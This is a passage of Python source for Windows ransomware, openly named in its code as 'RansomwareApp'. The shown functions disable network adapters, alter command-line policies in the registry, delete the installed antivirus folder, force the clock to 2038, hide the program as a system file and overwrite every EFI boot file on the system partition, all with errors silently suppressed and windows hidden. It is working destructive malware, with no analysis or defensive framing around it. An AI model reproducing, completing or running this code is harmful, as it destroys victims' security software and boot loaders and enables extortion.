        command = 'Get-NetAdapter | Disable-NetAdapter -Confirm:$false'
        run_powershell_command(command)
    except Exception:
        pass

def enable_cmd():
    try:
        key = reg.HKEY_CURRENT_USER
        sub_key = r"Software\Policies\Microsoft\Windows\System"
        with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as key_handle:
            reg.SetValueEx(key_handle, "DisableCMD", 0, reg.REG_DWORD, 0)
    except Exception:
        pass

def enable_powershell():
    try:
        key = reg.HKEY_CURRENT_USER
        sub_key = r"Software\Policies\Microsoft\Windows\PowerShell"
        with reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS) as key_handle:
            reg.SetValueEx(key_handle, "EnableScripts", 0, reg.REG_DWORD, 1)
    except Exception:
        pass

def enable_powershell2():
    try:
        key = reg.HKEY_LOCAL_MACHINE
        sub_key = r"SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as key_handle:
            reg.SetValueEx(key_handle, "DisablePowerShell", 0, reg.REG_DWORD, 0)
    except Exception:
        pass

def remove_antivirus():
    try:
        powershell_command = '''
        $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty PathToSignedProductExe
        Split-Path -Path $antivirus
        '''
        
        result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        antivirus_directory = result.stdout.strip()
        
        if antivirus_directory:
            subprocess.run(['cmd', '/c', 'rd', '/s', '/q', antivirus_directory], check=True, creationflags=subprocess.CREATE_NO_WINDOW) 
    except Exception:
           pass
def reset_date():
    while True:
        try:
            current_date = subprocess.run('date /t', shell=True, capture_output=True, text=True).stdout.strip()
            if current_date != '18-01-2038':
                subprocess.run('date 18-01-2038', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
           return False
def check_sys_executable():
  try:
    return os.path.exists(sys.executable)
  except Exception:
           pass
def make_system_file():
    try:
        script_path = sys.executable

        attributes = '+r +h +s'

        command = f'attrib "{script_path}" {attributes}'

        os.system(command)
    except Exception:
           pass
def copy_efi_file():
    try:
        subprocess.run(['mountvol', 'X:', '/S'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

        source_file = os.path.join(os.path.dirname(__file__), 'bootmgfw.efi')
        if not os.path.exists(source_file):
            source_file = os.path.join(os.path.dirname(sys.executable), 'bootmgfw.efi')
            if not os.path.exists(source_file):
                source_file = os.path.join(os.getcwd(), 'bootmgfw.efi')
                
        folder_path = 'X:\\'

        with open(source_file, 'rb') as boot_file:
            boot_content = boot_file.read()

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith('.efi'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'wb') as efi_file:
                        efi_file.write(boot_content)

        subprocess.run(['mountvol', 'X:', '/D'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

    except Exception:
        pass
def main():
    try:
            make_system_file()
            threading.Thread(target=enable_powershell).start()
            threading.Thread(target=enable_powershell2).start()
            threading.Thread(target=enable_cmd).start()
            threading.Thread(target=disable_all_network_adapters).start()
            time.sleep(5)  
            threading.Thread(target=reset_date).start()
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            time.sleep(5) 
            copy_efi_file()
            app = RansomwareApp()
            app.mainloop()
    except KeyboardInterrupt:
        os._exit(0)
    except Exception: 
        pass
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        os._exit(0)
    except Exception:
        pass